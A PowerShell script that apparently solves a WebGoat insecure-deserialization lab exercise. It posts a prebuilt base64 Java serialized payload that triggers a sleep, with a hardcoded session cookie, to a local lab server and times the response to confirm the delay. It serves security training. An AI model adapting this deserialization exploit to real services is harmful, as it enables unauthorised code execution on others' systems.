# Test our generated VulnerableTaskHolder payload

$webGoatUrl = "http://192.168.254.112:8001"
$sessionCookie = "25A6B220A4CB5215EBBE7B31E207B4B1"

Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Testing Generated Payload" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""

# Our generated payload
$payload = "rO0ABXNyABRWdWxuZXJhYmxlVGFza0hvbGRlcgAAAAAAAAABAgADSgAIdGFza1RpbWVMAAp0YXNrQWN0aW9udAASTGphdmEvbGFuZy9TdHJpbmc7TAAIdGFza05hbWVxAH4AAXhwAAAAAAAAE4h0AAVzbGVlcHQACURlbGF5VGFzaw=="

Write-Host "Testing payload with VulnerableTaskHolder class..." -ForegroundColor Yellow

$startTime = Get-Date

$headers = @{
    "Content-Type" = "application/x-www-form-urlencoded"
    "Cookie" = "JSESSIONID=$sessionCookie"
}

$body = "token=$([System.Web.HttpUtility]::UrlEncode($payload))"

try {
    $response = Invoke-WebRequest `
        -Uri "$webGoatUrl/WebGoat/InsecureDeserialization/task" `
        -Method POST `
        -Headers $headers `
        -Body $body `
        -UseBasicParsing `
        -TimeoutSec 30
    
    $endTime = Get-Date
    $elapsed = ($endTime - $startTime).TotalSeconds
    
    $result = $response.Content | ConvertFrom-Json
    
    Write-Host ""
    Write-Host "Response:" -ForegroundColor Green
    Write-Host "  Feedback: $($result.feedback)" -ForegroundColor White
    Write-Host "  Time Elapsed: $([math]::Round($elapsed, 2)) seconds" -ForegroundColor Cyan
    Write-Host "  Lesson Complete: $($result.lessonCompleted)" -ForegroundColor White
    
    if ($elapsed -ge 4.5 -and $elapsed -le 5.5) {
        Write-Host ""
        Write-Host "[SUCCESS] Delay is approximately 5 seconds!" -ForegroundColor Green
    }
    
} catch {
    $endTime = Get-Date
    $elapsed = ($endTime - $startTime).TotalSeconds
    
    Write-Host ""
    Write-Host "[ERROR] $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Time Elapsed: $([math]::Round($elapsed, 2)) seconds" -ForegroundColor Cyan
}

Write-Host ""
